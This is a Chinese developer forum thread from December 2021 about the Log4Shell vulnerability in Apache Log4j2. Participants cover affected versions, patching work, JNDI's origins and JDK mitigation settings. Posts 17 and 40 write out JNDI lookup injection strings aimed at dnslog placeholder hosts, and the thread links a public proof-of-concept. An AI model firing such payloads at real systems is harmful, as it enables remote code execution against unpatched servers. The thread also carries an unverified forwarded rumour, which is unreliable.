

*****

####  董卓  
##### 1#       楼主       发表于 2021-12-10 12:20

完全无条件

你啥各种序列化框架FastJSON啥还有条件的，简直就是渣渣

直接提权最高

你搞啥SQL注入的，弟中第

直接影响除了RC版本以外的全版本

大核弹

爽不爽

*****

####  ro4074  
##### 2#       发表于 2021-12-10 12:25

发这大部分人看不明白

*****

####  千里夜雨  
##### 3#       发表于 2021-12-10 12:26

能发pc区吗，没头没尾的超能力发言很容易遭人厌的，说实话

*****

####  董卓  
##### 4#         楼主| 发表于 2021-12-10 12:28

不是说好的编程归外野的么……

*****

####  风夏  
##### 5#       发表于 2021-12-10 12:28

能不能演示下漏洞怎么复现

—— 来自 HUAWEI VOG-AL00, Android 10上的 [S1Next-鹅版](https://github.com/ykrank/S1-Next/releases) v2.5.2

*****

####  SICP  
##### 6#       发表于 2021-12-10 12:28

能不能演示下漏洞怎么复现

*****

####  24k纯帅  
##### 7#       发表于 2021-12-10 12:29

没事，我写程序从不打log<img src="https://static.saraba1st.com/image/smiley/face2017/048.png" referrerpolicy="no-referrer">

*****

####  heroboy  
##### 8#       发表于 2021-12-10 12:30

[https://www.lunasec.io/docs/blog/log4j-zero-day/](https://www.lunasec.io/docs/blog/log4j-zero-day/)

*****

####  mrzc  
##### 9#       发表于 2021-12-10 12:30

<blockquote>24k纯帅 发表于 2021-12-10 12:29
没事，我写程序从不打log</blockquote>
你不打不代表做其它模块的人不打，这个漏洞可以直接把恶意代码写到你业务系统日志里去。

*****

####  seducer0719  
##### 10#       发表于 2021-12-10 12:31

[https://github.com/tangxiaofeng7/apache-log4j-poc](https://github.com/tangxiaofeng7/apache-log4j-poc)

攻击者可直接构造恶意请求，触发远程代码执行漏洞。漏洞利用无需特殊配置，经阿里云安全团队验证，Apache Struts2、Apache Solr、Apache Druid、Apache Flink等均受影响

*****

####  ryanz  
##### 11#       发表于 2021-12-10 12:34

也只是苦了那些卸磨杀驴的老板了吧，还在维护的，升个版本也不会有太多坑

*****

####  guevara1989  
##### 12#       发表于 2021-12-10 12:39

<img src="https://static.saraba1st.com/image/smiley/face2017/115.gif" referrerpolicy="no-referrer">卧槽，什么漏洞，我的代码打log都用的这个包

— from OnePlus GM1910, Android 11 of [S1 Next Goose](https://pan.baidu.com/s/1mi43uRm) v2.5.2

*****

####  bolitao  
##### 13#       发表于 2021-12-10 12:40

我以为这种经广泛使用的基础框架不会出这种问题<img src="https://static.saraba1st.com/image/smiley/face2017/003.png" referrerpolicy="no-referrer">

—— 来自 [S1Fun](https://s1fun.koalcat.com)

*****

####  battleship64  
##### 14#       发表于 2021-12-10 12:41

升个版本咯

*****

####  guevara1989  
##### 15#       发表于 2021-12-10 12:41

<blockquote><a href="httphttps://bbs.saraba1st.com/2b/forum.php?mod=redirect&amp;goto=findpost&amp;pid=53879925&amp;ptid=2041735" target="_blank">bolitao 发表于 2021-12-10 12:40</a>
我以为这种经广泛使用的基础框架不会出这种问题

—— 来自 S1Fun</blockquote>
前两年struts还出过漏洞呢

— from OnePlus GM1910, Android 11 of [S1 Next Goose](https://pan.baidu.com/s/1mi43uRm) v2.5.2

*****

####  Evilgurren  
##### 16#       发表于 2021-12-10 12:42

升也没用，rc2可能也会绕过

*****

####  cstljn  
##### 17#       发表于 2021-12-10 12:42

<blockquote><a href="httphttps://bbs.saraba1st.com/2b/forum.php?mod=redirect&amp;goto=findpost&amp;pid=53879693&amp;ptid=2041735" target="_blank">风夏 发表于 2021-12-10 12:28</a>

能不能演示下漏洞怎么复现

—— 来自 HUAWEI VOG-AL00, Android 10上的 S1Next-鹅版 v2.5.2 ...</blockquote>
${jndi:ldap://xxxxx.dnslog.cn/exp}  找个web接口传参，然后log.info打印

*****

####  董卓  
##### 18#         楼主| 发表于 2021-12-10 12:44

<blockquote><a href="httphttps://bbs.saraba1st.com/2b/forum.php?mod=redirect&amp;goto=findpost&amp;pid=53879925&amp;ptid=2041735" target="_blank">bolitao 发表于 2021-12-10 12:40</a>
我以为这种经广泛使用的基础框架不会出这种问题

—— 来自 S1Fun</blockquote>
开源软件每个人都可以审查
所以安全性更高<img src="https://static.saraba1st.com/image/smiley/face2017/009.gif" referrerpolicy="no-referrer">

*****

####  剑起苍斓  
##### 19#       发表于 2021-12-10 12:44

还在用logback

—— 来自 OnePlus ONEPLUS A5010, Android 9上的 [S1Next-鹅版](https://github.com/ykrank/S1-Next/releases) v2.5.2-play

*****

####  ryanz  
##### 20#       发表于 2021-12-10 12:44

<blockquote>guevara1989 发表于 2021-12-10 12:39
卧槽，什么漏洞，我的代码打log都用的这个包

— from OnePlus GM1910, Android 11 of S1 Next Goos ...</blockquote>
[https://www.v2ex.com/t/821217](https://www.v2ex.com/t/821217) 26楼

*****

####  catazshadow  
##### 21#       发表于 2021-12-10 12:48

防火墙不挡从内往外的请求的？

*****

####  PENTAX-DA  
##### 22#       发表于 2021-12-10 12:48

这就是阿里云全是挖矿病毒的街口吗

*****

####  すぴぱら  
##### 23#       发表于 2021-12-10 12:51

<img src="https://static.saraba1st.com/image/smiley/face2017/067.png" referrerpolicy="no-referrer">还好我只用自带的方法打log

*****

####  Cypher_96  
##### 24#       发表于 2021-12-10 12:54

后端全在搞这个，都没人对接业务需求了<img src="https://static.saraba1st.com/image/smiley/face2017/009.gif" referrerpolicy="no-referrer">

*****

####  保科智子  
##### 25#       发表于 2021-12-10 12:55

以为是什么高级play，兴冲冲进来看是哪个洞。<img src="https://static.saraba1st.com/image/smiley/face2017/001.png" referrerpolicy="no-referrer">

*****

####  锟斤拷  
##### 26#       发表于 2021-12-10 12:57

我超，这个也太容易利用了

*****

####  flyinwild  
##### 27#       发表于 2021-12-10 12:58

鄙司还用着1.2.x<img src="https://static.saraba1st.com/image/smiley/face2017/065.png" referrerpolicy="no-referrer">

—— 来自 Xiaomi M2007J17C, Android 11上的 [S1Next-鹅版](https://github.com/ykrank/S1-Next/releases) v2.5.2

*****

####  lsmnbs  
##### 28#       发表于 2021-12-10 13:04

已经改了版本<img src="https://static.saraba1st.com/image/smiley/face2017/009.gif" referrerpolicy="no-referrer">

*****

####  super_uni  
##### 29#       发表于 2021-12-10 13:06

不都是logback了么<img src="https://static.saraba1st.com/image/smiley/face2017/037.png" referrerpolicy="no-referrer">

— from OPPO PEGM00, Android 11 of [S1 Next Goose](https://pan.baidu.com/s/1mi43uRm) v2.5.2

*****

####  耕者有其田  
##### 30#       发表于 2021-12-10 13:09

超能力者笑话归外野，超能力做题归力扣。



*****

####  1096beam  
##### 31#       发表于 2021-12-10 13:22

看了一下，用的是1.2.x

你们这些码农不要老是追求花里胡哨的新技术.jpg

*****

####  广告位  
##### 32#       发表于 2021-12-10 13:30

md，昨天晚上一个电话从床上拽起来升版本，所有服务升一遍天都亮了

*****

####  pppp7049  
##### 33#       发表于 2021-12-10 13:49

Log4j1应该没影响，影响的好像是Log4j2<img src="https://static.saraba1st.com/image/smiley/face2017/037.png" referrerpolicy="no-referrer">

*****

####  neptunehs  
##### 34#       发表于 2021-12-10 13:54

 本帖最后由 neptunehs 于 2021-12-10 13:56 编辑 
<blockquote><a href="httphttps://bbs.saraba1st.com/2b/forum.php?mod=redirect&amp;goto=findpost&amp;pid=53880233&amp;ptid=2041735" target="_blank">flyinwild 发表于 2021-12-10 12:58</a>
鄙司还用着1.2.x

—— 来自 Xiaomi M2007J17C, Android 11上的 S1Next-鹅版 v2.5.2</blockquote>
v2ex不是曰1.x也受影响么

—— 来自 Xiaomi M2012K11AC, Android 11上的 [S1Next-鹅版](https://github.com/ykrank/S1-Next/releases) v2.5.2-play

*****

####  阴重华  
##### 35#       发表于 2021-12-10 13:58

你们难道不应该是在加班排查修复吗？

*****

####  假人  
##### 36#       发表于 2021-12-10 14:02

<img src="https://static.saraba1st.com/image/smiley/face2017/001.png" referrerpolicy="no-referrer">想弄明白这玩意需要哪些前置技能

*****

####  charse2r  
##### 37#       发表于 2021-12-10 14:03

<blockquote><a href="httphttps://bbs.saraba1st.com/2b/forum.php?mod=redirect&amp;goto=findpost&amp;pid=53880638&amp;ptid=2041735" target="_blank">1096beam 发表于 2021-12-10 13:22</a>

看了一下，用的是1.2.x

你们这些码农不要老是追求花里胡哨的新技术.jpg</blockquote>
也受影响23333

*****

####  bapijun1  
##### 38#       发表于 2021-12-10 14:05

<blockquote>假人 发表于 2021-12-10 14:02
想弄明白这玩意需要哪些前置技能</blockquote>
当几个月的码农，懂一点计算机网络安全的常识，就能读懂他的意思

*****

####  charse2r  
##### 39#       发表于 2021-12-10 14:19

不过其实防火墙把ldap的端口封了就行了吧？

*****

####  harry3  
##### 40#       发表于 2021-12-10 14:35

logger.info("${jndi:ldap://q0nh0g.dnslog.cn}");

*****

####  WaterWater1  
##### 41#       发表于 2021-12-10 14:37

<img src="https://static.saraba1st.com/image/smiley/face2017/001.png" referrerpolicy="no-referrer">领导要求全部涉及应用今天改完
<img src="https://static.saraba1st.com/image/smiley/face2017/003.png" referrerpolicy="no-referrer">我还想回去terraria

*****

####  カドモン  
##### 42#       发表于 2021-12-10 14:40

震惊我全家

*****

####  Charizard  
##### 43#       发表于 2021-12-10 14:41

别说了，为了修这个洞我司已经鸡飞狗跳一天了

—— 来自 HUAWEI NOH-AN00, Android 10上的 [S1Next-鹅版](https://github.com/ykrank/S1-Next/releases) v2.5.2

*****

####  杂色k  
##### 44#       发表于 2021-12-10 14:42

 本帖最后由 杂色k 于 2021-12-10 14:50 编辑 

看了眼，貌似大部分还在用log4j 1.x版本，问题不大，年轻人不要总是用新东西呀<img src="https://static.saraba1st.com/image/smiley/face2017/037.png" referrerpolicy="no-referrer">

没仔细看，乐早了<img src="https://static.saraba1st.com/image/smiley/face2017/252.png" referrerpolicy="no-referrer">

*****

####  董卓  
##### 45#         楼主| 发表于 2021-12-10 14:42

<blockquote><a href="httphttps://bbs.saraba1st.com/2b/forum.php?mod=redirect&amp;goto=findpost&amp;pid=53881393&amp;ptid=2041735" target="_blank">charse2r 发表于 2021-12-10 14:19</a>

不过其实防火墙把ldap的端口封了就行了吧？</blockquote>
ldap只是jndi漏洞之后的利用渠道方式之一，不是唯一

rmi之类的方式很多的

上面1.x的不要立flag

CORRECTION: log4j 1.x contains a JMS Appender which can use JNDI. So I would say that, yes, log4j 1.x is also impacted by this vulnerability

*****

####  fmeric  
##### 46#       发表于 2021-12-10 14:44

你没用jms appender不就不受影响了

*****

####  杂色k  
##### 47#       发表于 2021-12-10 14:48

<blockquote><a href="httphttps://bbs.saraba1st.com/2b/forum.php?mod=redirect&amp;goto=findpost&amp;pid=53881705&amp;ptid=2041735" target="_blank">董卓 发表于 2021-12-10 14:42</a>

ldap只是jndi漏洞之后的利用渠道方式之一，不是唯一

rmi之类的方式很多的</blockquote>
没仔细看，好像1.x的部门确实也调了配置的，我没参与，不知道细节<img src="https://static.saraba1st.com/image/smiley/face2017/216.png" referrerpolicy="no-referrer">

*****

####  charse2r  
##### 48#       发表于 2021-12-10 14:54

<blockquote><a href="httphttps://bbs.saraba1st.com/2b/forum.php?mod=redirect&amp;goto=findpost&amp;pid=53881720&amp;ptid=2041735" target="_blank">fmeric 发表于 2021-12-10 14:44</a>

你没用jms appender不就不受影响了</blockquote>
这东西一般没人用吧，感觉还好

*****

####  董卓  
##### 49#         楼主| 发表于 2021-12-10 14:58

你们就继续立还好的flag吧

这会儿抓出一个通过jms的，等会再抓出一个别的呢？<img src="https://static.saraba1st.com/image/smiley/face2017/067.png" referrerpolicy="no-referrer">

*****

####  AlphardAlSheya  
##### 50#       发表于 2021-12-10 15:00

不用 Java <img src="https://static.saraba1st.com/image/smiley/face2017/067.png" referrerpolicy="no-referrer">

*****

####  jctc  
##### 51#       发表于 2021-12-10 15:02

干死你们这帮java程序员

当年isu那哥们说用java实现一个amoeba的时候我就知道他搞不好化学

*****

####  Ferelasong  
##### 52#       发表于 2021-12-10 15:05

只用logback，springboot自带

*****

####  Dreamophobia  
##### 53#       发表于 2021-12-10 15:11

<img src="https://static.saraba1st.com/image/smiley/face2017/067.png" referrerpolicy="no-referrer">昨天晚上票圈都是后端们的加班哀嚎

*****

####  怂啊  
##### 54#       发表于 2021-12-10 15:20

看到你们加班好开心<img src="https://static.saraba1st.com/image/smiley/face2017/067.png" referrerpolicy="no-referrer">

*****

####  payboy  
##### 55#       发表于 2021-12-10 15:28

屎山用的低版本

*****

####  Evilgurren  
##### 56#       发表于 2021-12-10 15:33

这破玩意利用难度之低简直令人发指<img src="https://static.saraba1st.com/image/smiley/face2017/001.png" referrerpolicy="no-referrer">

*****

####  flyinwild  
##### 57#       发表于 2021-12-10 15:38

谁用JMS Appender啊，偏门玩意儿<img src="https://static.saraba1st.com/image/smiley/face2017/051.png" referrerpolicy="no-referrer">

*****

####  羽绒服  
##### 58#       发表于 2021-12-10 15:42

生产上周末不可能让更新的，完美

*****

####  recolic  
##### 59#       发表于 2021-12-10 15:53

前东家遭重了<img src="https://static.saraba1st.com/image/smiley/face2017/067.png" referrerpolicy="no-referrer">

*****

####  不热爱讨论  
##### 60#       发表于 2021-12-10 16:02

话说一个log的包，整这些花里胡哨的干嘛？  不影响性能？



*****

####  剑起苍斓  
##### 61#       发表于 2021-12-10 16:22

自己本地复现了，不过我们基本都是logback，而且都在内网，应该没啥问题了

—— 来自 OnePlus ONEPLUS A5010, Android 9上的 [S1Next-鹅版](https://github.com/ykrank/S1-Next/releases) v2.5.2-play

*****

####  moeful  
##### 62#       发表于 2021-12-10 16:23

内网应该不会出问题，看你们业务是内网还是外网吧 

*****

####  kenqqex  
##### 63#       发表于 2021-12-10 16:28

虽然都用上locback了，可是还是用marshalsec-0.0.3-SNAPSHOT-all  自己搞了个demo玩了一下，挺有趣的<img src="https://static.saraba1st.com/image/smiley/face2017/050.png" referrerpolicy="no-referrer">

*****

####  woodcoin  
##### 64#       发表于 2021-12-10 16:43

希望log4net没事



*****

####  风夏  
##### 65#       发表于 2021-12-10 17:14

<img src="https://img.saraba1st.com/forum/202112/10/171411mcfsm0aoo7z7v5n8.png" referrerpolicy="no-referrer">

<strong>2021-12-10_17-09.png</strong> (47.72 KB, 下载次数: 0)

下载附件

2021-12-10 17:14 上传

<img src="https://img.saraba1st.com/forum/202112/10/171411nonomo9b1b9baa29.png" referrerpolicy="no-referrer">

<strong>2021-12-10_17-09_1.png</strong> (38.88 KB, 下载次数: 0)

下载附件

2021-12-10 17:14 上传

logback没事

*****

####  yikaa  
##### 66#       发表于 2021-12-10 17:18

golang笑嘻嘻<img src="https://static.saraba1st.com/image/smiley/face2017/025.png" referrerpolicy="no-referrer">



*****

####  yzj134100  
##### 67#       发表于 2021-12-10 17:26

啊 希望没log4net的事



*****

####  zxlice  
##### 68#       发表于 2021-12-10 17:56

只用过spdlog<img src="https://static.saraba1st.com/image/smiley/face2017/067.png" referrerpolicy="no-referrer">

*****

####  ReiFukai  
##### 69#       发表于 2021-12-10 18:00

妈的，折腾了一下午了，公司GIT，发布系统都搞崩了

*****

####  熊喵喵  
##### 70#       发表于 2021-12-10 18:03

<blockquote><a href="httphttps://bbs.saraba1st.com/2b/forum.php?mod=redirect&amp;goto=findpost&amp;pid=53881077&amp;ptid=2041735" target="_blank">neptunehs 发表于 2021-12-10 13:54</a>
v2ex不是曰1.x也受影响么

—— 来自 Xiaomi M2012K11AC, Android 11上的 S1Next-鹅版 v2.5.2-play ...</blockquote>
阿里云曰影响版本2.x &lt; 2.15.0-rc2 



*****

####  wddark  
##### 71#       发表于 2021-12-10 18:11

<img src="https://static.saraba1st.com/image/smiley/face2017/001.png" referrerpolicy="no-referrer">今天鸡飞狗跳了一天，

新一点的项目基本springboot，就logback保平安

祖传屎山项目都是log4j1，特地试了没啥问题

log4j2 正好微妙的遇到了新业务空档期，没被使用过<img src="https://static.saraba1st.com/image/smiley/face2017/152.png" referrerpolicy="no-referrer">

*****

####  聚散浮云  
##### 72#       发表于 2021-12-10 18:13

发现常用的torchserve用了log4j，还好还没进prod<img src="https://static.saraba1st.com/image/smiley/face2017/169.gif" referrerpolicy="no-referrer">



*****

####  neptunehs  
##### 73#       发表于 2021-12-10 18:23

这看起来那么简易高效的bug 之前居然一直没被发现么

—— 来自 Xiaomi M2012K11AC, Android 11上的 [S1Next-鹅版](https://github.com/ykrank/S1-Next/releases) v2.5.2-play

*****

####  dangdang00  
##### 74#       发表于 2021-12-10 18:36

项目都是logback上午看到就略过了。周末刚下班在路上看到领导终于丢出了链接要自查<img src="https://static.saraba1st.com/image/smiley/face2017/002.png" referrerpolicy="no-referrer">

—— 来自 samsung SM-F7070, Android 11上的 [S1Next-鹅版](https://github.com/ykrank/S1-Next/releases) v2.4.4-alpha



*****

####  Prolun  
##### 75#       发表于 2021-12-11 08:13

幸亏俺们.NET的大部分都是用的Serilog



*****

####  lokomotiv  
##### 76#       发表于 2021-12-11 09:15

<img src="https://static.saraba1st.com/image/smiley/face2017/067.png" referrerpolicy="no-referrer">坐标丑国，昨天下班的时候在知乎上看到了这个漏洞，然后接着刷知乎，半小时后整个公司各个部门的oncall都被叫出来处理这个问题，结果build太多，请求把公司的build system给整爆了

—— 来自 Xiaomi MI 8 SE, Android 10上的 [S1Next-鹅版](https://github.com/ykrank/S1-Next/releases) v2.5.2

*****

####  lvcha  
##### 77#       发表于 2021-12-11 09:17

打log的也有漏洞，太奇怪了



*****

####  银河最大星爆  
##### 78#       发表于 2021-12-11 10:02

<img src="https://static.saraba1st.com/image/smiley/face2017/067.png" referrerpolicy="no-referrer">补丁都不知打到哪个版本去了，虽然是被逼的



*****

####  伽蓝寺听雨  
##### 79#       发表于 2021-12-11 10:45

昨天在泥潭看到还心说关我屁事，结果今天实验室老板就在群里发自查了

*****

####  alpha.h  
##### 80#       发表于 2021-12-11 11:00

内网也要处理，还好有自动处理平台，写个脚本划定范围推下去就行。



*****

####  qiandai  
##### 81#       发表于 2021-12-11 12:11

多大点事

—— 来自 HUAWEI BMH-AN10, Android 10上的 [S1Next-鹅版](https://github.com/ykrank/S1-Next/releases) v1.3.3.2-play



*****

####  zz1zz  
##### 82#       发表于 2021-12-11 13:39

请问slf4+log4j2.11会有问题吗？

*****

####  tk553521  
##### 83#       发表于 2021-12-11 13:43

logbackyyds

—— 来自 Sony XQ-AT72, Android 11上的 [S1Next-鹅版](https://github.com/ykrank/S1-Next/releases) v2.5.2



*****

####  明明有雨  
##### 84#       发表于 2021-12-11 13:48

<blockquote><a href="httphttps://bbs.saraba1st.com/2b/forum.php?mod=redirect&amp;goto=findpost&amp;pid=53881705&amp;ptid=2041735" target="_blank">董卓 发表于 2021-12-10 14:42</a>
ldap只是jndi漏洞之后的利用渠道方式之一，不是唯一

rmi之类的方式很多的</blockquote>
求出处？



*****

####  char1st  
##### 85#       发表于 2021-12-11 14:08

 本帖最后由 char1st 于 2021-12-11 14:17 编辑 

<img src="https://docs.oracle.com/javase/tutorial/figures/jndi/jndiarch.gif" referrerpolicy="no-referrer">

&gt;=JDK 6u45、7u21 java.rmi.server.useCodebaseOnly

&gt;=JDK 6u141、7u131、8u121 com.sun.jndi.rmi.object.trustURLCodebase

&gt;= JDK 6u211、7u201、8u191 com.sun.jndi.ldap.object.trustURLCodebase

*****

####  whzfjk  
##### 86#       发表于 2021-12-11 14:17

注入不提，开发者有需求在打 log 的时候用 jndi 吗？



*****

####  kenqqex  
##### 87#       发表于 2021-12-13 09:18

<blockquote><a href="httphttps://bbs.saraba1st.com/2b/forum.php?mod=redirect&amp;goto=findpost&amp;pid=53891745&amp;ptid=2041735" target="_blank">明明有雨 发表于 2021-12-11 13:48</a>

求出处？</blockquote>
漏洞说明写的，举例子rmi 协议 的也行



*****

####  loveumlj  
##### 88#       发表于 2021-12-13 10:55

【Log4j高危漏洞！具体原因解析！全网第一！-哔哩哔哩】 [https://b23.tv/JbDu0Wg](https://b23.tv/JbDu0Wg)

rmi的都行 不止ldap

[  -- 来自 能手机投票的 Stage1官方 iOS客户端](https://itunes.apple.com/fi/app/saraba1st/id1221237470?mt=8)



*****

####  lvcha  
##### 89#       发表于 2021-12-13 11:38

我们上周刚刚gm的版本也被弄回来自查推迟gm了。

*****

####  尼曼兔  
##### 90#       发表于 2021-12-13 11:40

为了这破事昨天2点才睡，今天继续补丁



*****

####  希德尼娅  
##### 91#       发表于 2021-12-13 13:54

这届cia活太糙了

*****

####  Redis  
##### 92#       发表于 2021-12-13 14:02

这种漏洞简直不是漏洞了

是走过路过不要错过，大家来玩儿啊<img src="https://static.saraba1st.com/image/smiley/face2017/037.png" referrerpolicy="no-referrer">



*****

####  Destiny4073  
##### 93#       发表于 2021-12-13 23:17

我的世界也有这漏洞



*****

####  处男鉴黄师  
##### 94#       发表于 2021-12-14 01:09

<blockquote><a href="httphttps://bbs.saraba1st.com/2b/forum.php?mod=redirect&amp;goto=findpost&amp;pid=53915184&amp;ptid=2041735" target="_blank">loveumlj 发表于 2021-12-13 10:55</a>

【Log4j高危漏洞！具体原因解析！全网第一！-哔哩哔哩】 https://b23.tv/JbDu0Wg

rmi的都行 不止ldap</blockquote>
看了感想是太不可思议了，执行log内容已经够奇葩，为什么还能执行远端电脑上的服务<img src="https://static.saraba1st.com/image/smiley/face2017/091.png" referrerpolicy="no-referrer">



*****

####  martinium  
##### 95#       发表于 2021-12-14 04:32

什么漏洞，明明是后门，玩腻了被人扔了

— from samsung SM-G781U1, Android 11 of [S1 Next Goose](https://pan.baidu.com/s/1mi43uRm) v2.5.2-play

*****

####  北卡厨王  
##### 96#       发表于 2021-12-14 05:58

这个jndi有啥应用场景啊?这种把远端的代码拉回本地跑的协议听起来就很危险。



*****

####  Redis  
##### 97#       发表于 2021-12-14 07:01

<blockquote><a href="httphttps://bbs.saraba1st.com/2b/forum.php?mod=redirect&amp;goto=findpost&amp;pid=53926600&amp;ptid=2041735" target="_blank">北卡厨王 发表于 2021-12-14 05:58</a>

这个jndi有啥应用场景啊?这种把远端的代码拉回本地跑的协议听起来就很危险。 ...</blockquote>
没错

这种feature是怎么被想出来的<img src="https://static.saraba1st.com/image/smiley/face2017/068.png" referrerpolicy="no-referrer">

想想简直都太危险



*****

####  董卓  
##### 98#         楼主| 发表于 2021-12-14 07:27

<blockquote><a href="httphttps://bbs.saraba1st.com/2b/forum.php?mod=redirect&amp;goto=findpost&amp;pid=53926600&amp;ptid=2041735" target="_blank">北卡厨王 发表于 2021-12-14 05:58</a>
这个jndi有啥应用场景啊?这种把远端的代码拉回本地跑的协议听起来就很危险。 ...</blockquote>
jndi本身是个很常用的场景

比如你希望你的一个系统可以到处部署
你的系统中需要连接数据库
这个数据库连接的url地址不能写死在代码中
需要放在一个本地操作系统环境XXX变量里
然后用jndi来lookup这个XXX变量

这样配置是外部的，可以每次给这个新的产品使用方部署
只要改一下本地操作系统环境XXX变量，而不是改代码了

然后这个玩法就被玩花了
有人说、我上云了、serverless了，不能依赖所有的本地存储和操作系统变量了。我要用另外的高可用的云服务来给我配置。

Ok，于是就可以jndi请求远程来拉取配置了

哦，然后远程代码如何限制、会不会破你本地防？
“屎山写了再说，我又不太懂安全。开源社区大佬合并的时候一定会检查出来，退了我的合并再改就是了～”



*****

####  橋白  
##### 99#       发表于 2021-12-14 09:50

我司效率不行啊 今天才发邮件让自查<img src="https://static.saraba1st.com/image/smiley/face2017/065.png" referrerpolicy="no-referrer">

*****

####  宵神乐  
##### 100#       发表于 2021-12-14 09:54

VMware也中招，不过我放假不关我事<img src="https://static.saraba1st.com/image/smiley/face2017/065.png" referrerpolicy="no-referrer">

*****

####  Sakaiyuki  
##### 101#       发表于 2021-12-14 09:58

这大概是许多小孩崽子平生遇到的第一个洞<img src="https://static.saraba1st.com/image/smiley/face2017/066.png" referrerpolicy="no-referrer">



*****

####  清光の学生会长  
##### 102#       发表于 2021-12-14 17:45

一句话看不懂讨论了一百多楼，脱节了，伤心了，退坛了<img src="https://static.saraba1st.com/image/smiley/face2017/118.png" referrerpolicy="no-referrer">

—— 来自 HUAWEI ELE-AL00, Android 10上的 [S1Next-鹅版](https://github.com/ykrank/S1-Next/releases) v2.5.2



*****

####  走在路上  
##### 103#       发表于 2021-12-16 21:02

<blockquote>阿里云将该漏洞第一时间报给了美国 Apache 公司,并未向我国工信部报备该漏洞,且间隔17天后 Apache 公司发布补丁オ对公众公布此事。(一般公司产品漏洞的修复时间及发布补丁不会超过三天)在此期间,如果利用漏洞发起攻击,影响的范围堪比2017年”永恒之蓝”病毒,当年的 WannaCry 勒索病毒,致使美国、英国、俄罗斯、中国等至少150个国家,30万名用户中招。目前中美形式十分紧张,美对我网络攻击持续渗透中,国安、部委正在排查我国资产受否已受到境外攻击,造成信息被窃取或者服务器、系统被植入木马等损失。

12月12日下午工信部组织阿里云及奇安信等安全厂商开了关于阿帕奇漏洞的会议。会上工信部点名批评了阿里云未能及时将此事报备国内。

12月14日,获悉新华社已将此漏洞情况以内参形式报送至中办、国办,由于此漏洞影响过大,目前监管还在忙于漏洞的处置,下一步中办、国办有追责工信部的可能,对我集团有问责风险,建议业务团队和 GR 对此事持续关注。</blockquote>

消息转自QQ群，信源不清楚



*****

####  charse2r  
##### 104#       发表于 2021-12-16 21:14

<blockquote><a href="httphttps://bbs.saraba1st.com/2b/forum.php?mod=redirect&amp;goto=findpost&amp;pid=53964768&amp;ptid=2041735" target="_blank">走在路上 发表于 2021-12-16 21:02</a>

消息转自QQ群，信源不清楚</blockquote>
把乌云关了不是活该么

*****

####  ninini212  
##### 105#       发表于 2021-12-16 21:19

<img src="https://static.saraba1st.com/image/smiley/face2017/020.png" referrerpolicy="no-referrer">不要尬黑，阿里第一时间报给宗主国了嗷

全球数亿台设备可能面临新发现的软件漏洞，拜登政府高级网络官员周一警告美国主要行业的高管，他们需要立即采取行动来解决“当下最严重的问题”。

随着主要科技公司努力遏制事件的影响，美国官员也与行业高管举行了电话会议，警告黑客正在积极利用该漏洞。

“这个漏洞是我整个职业生涯中见过的最严重的漏洞之一。”美国网络安全和基础设施安全局 (CISA) 主任 Jen Easterly 在与 C NN 参与的电话会议中说. 大型金融公司和医疗保健高管参加了电话简报会。

这是自上周晚些时候有消息称黑客正在利用它试图闯入组织的计算机网络以来，美国官员对该软件缺陷发出的最严厉警告。

专家告诉 C NN，解决这些漏洞可能需要数周时间，而且疑似东方大国黑客已经在试图利用它。

该漏洞存在于名为“Log4j”的基于 Java 的软件中，大型组织(包括一些世界上最大的科技公司)使用该软件来记录其应用程序的信息。亚马逊网络服务和IBM等科技巨头已采取行动解决其产品中的错误。

它为黑客提供了一种访问组织计算机服务器的相对简单的方法。从那里，攻击者可以设计其他方法来访问组织网络上的系统。

管理 Log4j 软件的 Apache 软件基金会已发布安全修复程序供组织应用。

但据网络安全公司Cloudflare 称，攻击者在该软件缺陷被公开披露之前已经领先了一个多星期。

组织现在正在与时间赛跑，以弄清楚他们是否拥有运行暴露在互联网上的易受攻击软件的计算机。政府和行业的网络安全高管正夜以继日地解决这个问题。

CISA 的另一位官员杰伊·加兹莱 (Jay Gazlay) 在电话中说：“我们将必须确保我们持续努力，以了解整个美国关键基础设施中此代码的风险。”

网络安全公司 Mandiant 的高级副总裁兼首席技术官 Charles Carmakal 表示，与东方大国有关联的黑客已经开始利用该漏洞。Mandiant 拒绝详细说明黑客针对的组织。

----发送自 [samsung SM-G9650,Android 10](http://stage1.5j4m.com/?1.37)



*****

####  Benighted  
##### 106#       发表于 2021-12-16 21:37

<blockquote><a href="httphttps://bbs.saraba1st.com/2b/forum.php?mod=redirect&amp;goto=findpost&amp;pid=53926649&amp;ptid=2041735" target="_blank">Redis 发表于 2021-12-14 07:01</a>

没错

这种feature是怎么被想出来的</blockquote>
[https://issues.apache.org/jira/browse/LOG4J2-313](https://issues.apache.org/jira/browse/LOG4J2-313)

起源 <blockquote>Currently, Lookup plugins [1] don't support JNDI resources.

It would be really convenient to support JNDI resource lookup in the configuration.

One use case with JNDI lookup plugin is as follows:

I'd like to use RoutingAppender [2] to put all the logs from the same web application context in a log file (a log file per web application context).

And, I want to use JNDI resources look up to determine the target route (similarly to JNDI context selector of logback [3]).

Determining the target route by JNDI lookup can be advantageous because we don't have to add any code to set properties for the thread context and JNDI lookup should always work even in a separate thread without copying thread context variables.

[1] [http://logging.apache.org/log4j/2.x/manual/lookups.html](http://logging.apache.org/log4j/2.x/manual/lookups.html)

[2] [http://logging.apache.org/log4j/ ... tml#RoutingAppender](http://logging.apache.org/log4j/2.x/manual/appenders.html#RoutingAppender)

[3] [http://logback.qos.ch/manual/contextSelector.html](http://logback.qos.ch/manual/contextSelector.html)</blockquote>



*****

####  肆拾肆  
##### 107#       发表于 2021-12-16 22:10

<blockquote><a href="httphttps://bbs.saraba1st.com/2b/forum.php?mod=redirect&amp;goto=findpost&amp;pid=53964917&amp;ptid=2041735" target="_blank">charse2r 发表于 2021-12-16 21:14</a>

把乌云关了不是活该么</blockquote>
乌云是对接政府机构么？阿里会第一时间把漏洞上传乌云么？<img src="https://static.saraba1st.com/image/smiley/face2017/009.gif" referrerpolicy="no-referrer">



*****

####  坏掉了  
##### 108#       发表于 2021-12-16 23:00

搭车问一下，

我单位内网主页时用phpstudy自带的apache和mysql做服务，上级发紧急文要查Log4j漏洞，请问我们这个主页服务器是否受影响？



*****

####  super_uni  
##### 109#       发表于 2021-12-16 23:09

<blockquote><a href="httphttps://bbs.saraba1st.com/2b/forum.php?mod=redirect&amp;goto=findpost&amp;pid=53926713&amp;ptid=2041735" target="_blank">董卓 发表于 2021-12-14 07:27</a>
jndi本身是个很常用的场景

比如你希望你的一个系统可以到处部署</blockquote>
j2ee各种傻逼功能真的是祸害了整整20年有余

— from OPPO PEGM00, Android 11 of [S1 Next Goose](https://pan.baidu.com/s/1mi43uRm) v2.5.2

*****

####  super_uni  
##### 110#       发表于 2021-12-16 23:10

